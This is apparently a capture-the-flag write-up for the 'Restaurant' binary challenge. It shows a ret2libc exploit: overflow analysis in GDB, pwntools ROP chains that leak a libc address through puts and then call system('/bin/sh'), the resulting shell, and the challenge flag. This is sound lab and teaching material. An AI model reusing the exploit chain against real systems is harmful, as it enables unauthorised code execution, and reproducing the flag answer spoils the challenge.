# Restaurant

Welcome to our Restaurant. Here, you can eat and drink as much as you want! Just don't overdo it..

# Solution

First things first

```bash
cmd: checksec --file=restaurant

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78) Symbols	  No	0		2		restaurant
```

We can see that the binary is not stripped (which is always good). Another thing is that the challenge files include a **LIBC** binary, so it might be a return to libc without information disclosure but lets take a look at the program itself <br>

```
🥡 Welcome to Rocky Restaurant 🥡

What would you like?
1. Fill my dish.
2. Drink something
> 1

You can add these ingredients to your dish:
1. 🍅
2. 🧀
You can also order something else.
> 1

Enjoy your 1
```

If we've chosen cheese (2) the answer is the same. Lets try to **Drink something** <br>

``` 
🥡 Welcome to Rocky Restaurant 🥡

What would you like?
1. Fill my dish.
2. Drink something
> 2

What beverage would you like?
1. Water.
2. 🥤.
> 1

Enjoy your drink!
```

It also displays the same message for both choices <br>

Trying to find some weird behavior i found a buffer overflow with the following input
```
🥡 Welcome to Rocky Restaurant 🥡

What would you like?
1. Fill my dish.
2. Drink something
> 1

You can add these ingredients to your dish:
1. 🍅
2. 🧀
You can also order something else.
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Enjoy your AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
����zsh: segmentation fault (core dumped)  ./restaurant
```

So, we might be successful by applying the initial thought theory of **ret2libc** because there's no **canaries** and no **pie** so we can overflow the **RIP** and call **system(/bin/sh)** <br>

But first, lets analyze the binary in IDA to have a complete picture of what is happening under the hood <br>

The decompilation code does not add much to what we already know just denotes that the read function reads **0x400** bytes which is a lot !! <br>

By using GDB, we can see the return address and the start of the buffer and thus we can calculate the offset in order to hijack the execution flow

```assembly
gdb-peda$ disass fill
----snip----
0x0000000000400ebc <+114>:   lea    rax,[rbp-0x20]                 
0x0000000000400ec0 <+118>:   mov    edx,0x400                      
0x0000000000400ec5 <+123>:   mov    rsi,rax                        
0x0000000000400ec8 <+126>:   mov    edi,0x0                        
0x0000000000400ecd <+131>:   call   0x400690 <read@plt>
0x0000000000400ed2 <+136>:   lea    rax,[rbp-0x20]
----snip----
0x0000000000400eea <+160>:   nop                                   
0x0000000000400eeb <+161>:   leave                                 
0x0000000000400eec <+162>:   ret


gdb-peda$ b *0x0000000000400ed2  (after read)
gdb-peda$ b *0x0000000000400eec  (at ret instruction)
gdb-peda$ r

gdb-peda$ w/wx $rbp-0x20
0x7fffffffe210: 0x41414141

gdb-peda$ c

gdb-peda$ x/wx $rsp
0x7fffffffe238: 0x00400ff3

gdb-peda$ p 0x7fffffffe238-0x7fffffffe210                             
$3 = 0x28
```

So, in order to abuse the ret instruction we need to pad the buffer with **40** (0x28) bytes of junk <br>

The next step, is to leak some libc address in order to calculate the library base address. To achieve this i used **pwntools** ROP functionality
```python
rop = ROP(elf)

rop.call((rop.find_gadget(["ret"]))[0])                     # ret instruction to align the stack
rop.call(elf.plt["puts"], [next(elf.search(b"\n\x00"))])    # call puts with a string containing a newline and a null-byte (to break the output message and ease the leak parsing)
rop.call(elf.plt["puts"], [elf.got["puts"]])                # call puts.plt with the puts.got address (to leak it)
rop.call(elf.symbols["fill"])                               # after leaking, call fill again
``` 

This ropchain generates the following assembly code
```assembly
0x0000:         0x40063e 0x40063e()             <- the ret instruction for alignment                       
0x0008:         0x4010a3 pop rdi; ret           <- pops into RDI (the puts function argument)                      
0x0010:         0x400604 [arg0] rdi = 4195844   <- calls                      
0x0018:         0x400650                                              
0x0020:         0x4010a3 pop rdi; ret           <- pops into RDI (the puts.got address)                      
0x0028:         0x601fa8 [arg0] rdi = got.puts  <- calls                      
0x0030:         0x400650                                              
0x0038:         0x400e4a 0x400e4a()             <- call fill                         
```

Now we need to parse the leak and calculate the libc base address
```python
log.progress("Receiving junk ...")
print(com.recvline())
print(com.recvline())
print(com.recvline())

log.success("Leak received !")
leak = u64(com.recvuntil(b"\n").strip().ljust(8, b"\x00"))

log.info("Puts leaked address @ {}".format(hex(leak)))

libc.address = leak - libc.symbols["puts"]
```

After this, we just need to construct another ropchain to call system but this time using the addresses in the libc elf
```python
rop = ROP(libc)

rop.call((rop.find_gadget(["ret"]))[0])                     # ret instruction to align the stack
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
```

And voila, we got a shell
```
$ whoami && id
ctf
uid=999(ctf) gid=999(ctf) groups=999(ctf)

$ ls -la
total 2016
drwxr-xr-x 1 root ctf     4096 Feb 23 14:16 .
drwxr-xr-x 1 root root    4096 Jan 22 02:23 ..
-r--r----- 1 root ctf       29 Feb 23 14:15 flag.txt
-rwxr-xr-x 1 root ctf  2030928 Feb 23 14:15 libc.so.6
-rwxr-x--- 1 root ctf    12952 Feb 23 14:15 restaurant
-rwxr-x--- 1 root ctf       41 Feb 23 14:15 run_challenge.sh

```

**Flag:** HTB{r3turn_2_th3_r3st4ur4nt!}
